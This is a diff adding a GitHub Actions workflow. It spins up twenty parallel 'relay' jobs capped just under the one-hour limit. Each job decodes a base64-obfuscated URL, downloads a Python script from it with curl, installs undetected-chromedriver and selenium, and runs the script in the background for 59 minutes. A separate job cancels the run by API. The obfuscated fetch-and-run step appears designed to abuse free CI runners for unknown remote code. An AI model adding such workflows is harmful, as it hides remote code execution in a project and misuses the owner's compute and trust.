@@ -1,0 +1,106 @@
+name: Cloistered Parallel Relay Matrix
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: cloistered-matrix-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مُشرف الأفق: يُطلق أمر الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  boundary-overseer:
+    name: "Boundary Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Sound Boundary Alarm
+        run: |
+          echo "[OVERSEER] Boundary overseer on watch. Alarm set for the 59-minute perimeter."
+          echo "[OVERSEER] Logging execution fingerprint: ${{ github.run_id }}"
+          
+          # فترة الترقّب المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[OVERSEER] Perimeter breached! Sounding boundary alarm..."
+          
+          # إرسال إشارة الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[OVERSEER] Alarm sounded. Every running and queued relay will be dismantled."
+
+  # =================================================================
+  # المرحّلات المتوازية: إنشاء وتشغيل خلايا الترحيل
+  # =================================================================
+  relay-cluster:
+    name: "RelayNode-${{ matrix.node_ref }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_ref: [301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع [1]: تجهيز الأرضية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Lay Groundwork
+        run: |
+          echo "[GROUND] Laying groundwork for RelayNode-${{ matrix.node_ref }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع [2]: جلب الحمولة البرمجية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Acquire Software Payload
+        run: |
+          echo "[ACQUIRE] Acquiring relay_bundle.py from designated relay origin..."
+          RELAY_ORIGIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$RELAY_ORIGIN" -o relay_bundle.py
+          echo "[ACQUIRE] Software payload acquired."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع [3]: تجميع الحزم التكميلية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Assemble Complementary Bundles
+        run: |
+          echo "[ASSEMBLE] Assembling complementary bundles..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع [4]: التنفيذ المحدد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Engage Relay Sequence
+        run: |
+          echo ">> Engaging RelayNode-${{ matrix.node_ref }} sequence..."
+          
+          # تشغيل العملية في الخلفية
+          python3 relay_bundle.py &
+          RELAY_PID=$!
+          
+          echo ">> Relay sequence engaged. Span: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $RELAY_PID 2>/dev/null; then
+            echo ">> Relay span elapsed! Dismantling sequence..."
+            kill -9 $RELAY_PID
+            echo ">> Sequence dismantled by span controller."
+          else
+            echo ">> Sequence concluded within relay span."
+          fi
